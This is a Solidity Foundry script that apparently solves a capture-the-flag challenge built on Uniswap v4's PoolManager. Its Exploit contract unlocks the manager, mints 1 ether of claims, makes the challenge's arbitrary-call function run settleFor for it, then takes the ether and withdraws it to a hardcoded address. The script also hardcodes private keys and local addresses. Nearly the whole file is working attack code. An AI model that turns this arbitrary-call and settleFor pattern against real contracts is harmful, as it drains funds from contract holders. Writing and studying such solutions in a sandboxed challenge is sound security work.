// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {Challenge} from "src/challenge.sol";
import {CurrencyLibrary, Currency} from "v4-core/src/types/Currency.sol";
import {Hook} from "src/Hook.sol";
import {ERC20} from "src/ERC20.sol";

contract Exploit {

    receive() external payable {}

    function unlockCallback(bytes calldata data) external returns (bytes memory) {

        (Challenge challenge, PoolManager manager) = abi.decode(data, (Challenge, PoolManager));
        // call to challenge, a = challenge, data = (target = manager, value= settleFor)

        manager.mint(address(this), 0, 1 ether);

        bytes memory innerData = abi.encodeWithSelector(
            Challenge.arbitrary.selector, address(manager), 
            abi.encodeWithSelector(PoolManager.settleFor.selector, address(this)));

        challenge.arbitrary(address(challenge), innerData);

        manager.take(Currency.wrap(address(0)), address(this), 1 ether);
        manager.burn(address(this), 0, 1 ether);
    }

    function runIt(Challenge challenge, PoolManager manager) public {


        bytes memory data = abi.encode(challenge, manager);

        manager.unlock(data);
    }

    function withdraw(address recpt) public {
        payable(recpt).call{value: address(this).balance}("");
    }

}

contract Solution is Script {

function getContractCode(address _addr) public view returns (bytes memory) {
    bytes memory code;
    assembly {
        // retrieve the size of the code, this needs assembly
        let size := extcodesize(_addr)
        // allocate output byte array - this could also be done without assembly
        // by using code = new bytes(size)
        code := mload(0x40)
        // new "memory end" including padding
        mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
        // store length in memory
        mstore(code, size)
        // actually retrieve the code, this needs assembly
        extcodecopy(_addr, add(code, 0x20), 0, size)
    }
    return code;
}

    function run() external {

        // uint256 systemKey = uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80);
        // console.log(vm.addr(systemKey));

        // bytes memory contractCode = getContractCode(0xbadf992b9f9b5e7472063a6ff59a898e7575bc72a4032f);

        // console.log(contractCode.length);

        // bytes memory contractCode = getContractCode(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);
        // console.log(contractCode.length);

        // contractCode = getContractCode(0x7400872EE85d4546F9CB4Fa776c43B5E0c78C0C0);
        // console.log(contractCode.length);
        uint256 pk = uint256(0xf2bb452a08e478f366f18a4c3e7d166f1ceac95a2e06b7f6ec2f45914d4ccee3);
        console.log(vm.addr(pk));
        vm.startBroadcast(pk);

        Challenge challenge = Challenge(payable(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0));
        PoolManager manager = PoolManager(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);

        // initial challenge balance for token: 1000e18
        // initial challenge balance for ether: 1e18

        // unlock pool manager
        // modify liquidity
        // transfer 1 ether to hook
        // swap on pool with 1001 eth
        // do a reverse swap 
        // remove liquidity
        // settle

        // OR

        // unlock pool manager
        // mint 1 ether to our address
        // call arbitrary to send 

        Exploit exploit = new Exploit();

        exploit.runIt(challenge, manager);

        exploit.withdraw(0x8c791929D7E04a3b633A2c02adF209026f1Bf4CB);

        vm.stopBroadcast();
    }
}
